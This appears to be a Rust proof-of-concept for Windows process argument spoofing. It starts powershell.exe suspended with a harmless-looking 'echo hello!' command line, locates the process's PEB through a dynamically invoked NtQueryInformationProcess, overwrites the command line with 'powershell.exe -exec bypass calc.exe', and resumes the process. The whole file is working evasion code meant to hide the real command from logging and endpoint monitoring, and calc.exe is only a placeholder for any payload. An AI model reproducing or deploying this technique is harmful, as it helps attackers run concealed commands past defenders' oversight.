use std::ffi::CString;
use std::mem;
use std::ptr;
use dinvoke_rs::dinvoke;
use winapi::shared::minwindef::{DWORD, LPVOID};
use winapi::shared::ntdef::PVOID;
use winapi::um::memoryapi::{ReadProcessMemory, WriteProcessMemory};
use winapi::um::processthreadsapi::{CreateProcessA, ResumeThread, STARTUPINFOA, PROCESS_INFORMATION};
use winapi::um::winbase::{CREATE_NEW_CONSOLE, CREATE_SUSPENDED};
use winapi::um::minwinbase::SECURITY_ATTRIBUTES;
use winapi::um::winnt::HANDLE;
use windows::Win32::Foundation::NTSTATUS;
use windows::Win32::System::Threading::PROCESS_BASIC_INFORMATION;

fn main() {
    let new_command = "powershell.exe -exec bypass calc.exe";
    let command = format!("{: <width$}", "powershell.exe echo hello!", width = new_command.len());
    let command_len = command.len() as u16;

    println!("Starting... {}", command.trim());

    let mut si: STARTUPINFOA = unsafe { mem::zeroed() };
    si.cb = mem::size_of::<STARTUPINFOA>() as DWORD;
    let mut process_info: PROCESS_INFORMATION = unsafe { mem::zeroed() };
    let mut sa = SECURITY_ATTRIBUTES {
        nLength: mem::size_of::<SECURITY_ATTRIBUTES>() as DWORD,
        lpSecurityDescriptor: ptr::null_mut(),
        bInheritHandle: 0,
    };
    let command_cstring = CString::new(command).unwrap();
    let command_ptr = command_cstring.into_raw();

    unsafe {
        // Create a suspended process
        CreateProcessA(
            ptr::null_mut(),
            command_ptr,
            &mut sa,
            &mut sa,
            0,
            CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
            ptr::null_mut(),
            CString::new("C:\\windows\\").unwrap().into_raw(),
            &mut si,
            &mut process_info,
        );

        let mut pbi: PROCESS_BASIC_INFORMATION =  mem::zeroed();

        // Use NtQueryInformationProcess to get PEB address
        let ntdll: isize = dinvoke::get_module_base_address("ntdll.dll");
        println!("[+] Querying process information");
        let _ret: Option<NTSTATUS>;
        let mut ret_len: u32 = 0;
        let ptr_nt_query_information_process: unsafe fn (HANDLE, u32, *mut PROCESS_BASIC_INFORMATION, u32, *mut u32) -> NTSTATUS;

        dinvoke::dynamic_invoke!(ntdll, "NtQueryInformationProcess", ptr_nt_query_information_process, _ret, process_info.hProcess, 0, &mut pbi, std::mem::size_of_val(&pbi) as u32, &mut ret_len);

        println!("PEB Base Address: 0x{:X}", pbi.PebBaseAddress as usize);

        let mut peb_buffer: [u8; 8] = [0; 8];
        let _bytes_read: DWORD = 0;

        // Read PEB address for process parameters
        ReadProcessMemory(
            process_info.hProcess,
            (pbi.PebBaseAddress as usize + 0x20) as LPVOID,
            peb_buffer.as_mut_ptr() as LPVOID,
            peb_buffer.len(),
            std::ptr::null_mut(),
        );

        let process_parameters: PVOID = mem::transmute(u64::from_le_bytes(peb_buffer));
        println!("Process Parameters Address: 0x{:X}", process_parameters as usize);

        let mut cmd_buffer: [u8; 8] = [0; 8];

        // Read CommandLine address from process parameters
        ReadProcessMemory(
            process_info.hProcess,
            (process_parameters as usize + 0x78) as LPVOID,
            cmd_buffer.as_mut_ptr() as LPVOID,
            cmd_buffer.len(),
            std::ptr::null_mut(),
        );

        let command_line: PVOID = mem::transmute(u64::from_le_bytes(cmd_buffer));
        println!("CommandLine Address: 0x{:X}", command_line as usize);

        let new_cmd_line = new_command.encode_utf16().collect::<Vec<u16>>();
        let new_cmd_line_len = new_cmd_line.len() * 2;

        // Write new command line in CommandLine address
        WriteProcessMemory(
            process_info.hProcess,
            command_line as LPVOID,
            new_cmd_line.as_ptr() as LPVOID,
            new_cmd_line_len,
            std::ptr::null_mut(),
        );

        // Write command length to PEB
        WriteProcessMemory(
            process_info.hProcess,
            (process_parameters as usize + 112) as LPVOID,
            &command_len as *const u16 as LPVOID,
            mem::size_of::<u16>(),
            std::ptr::null_mut(),
        );

        // Resume suspended process
        ResumeThread(process_info.hThread);
    }
}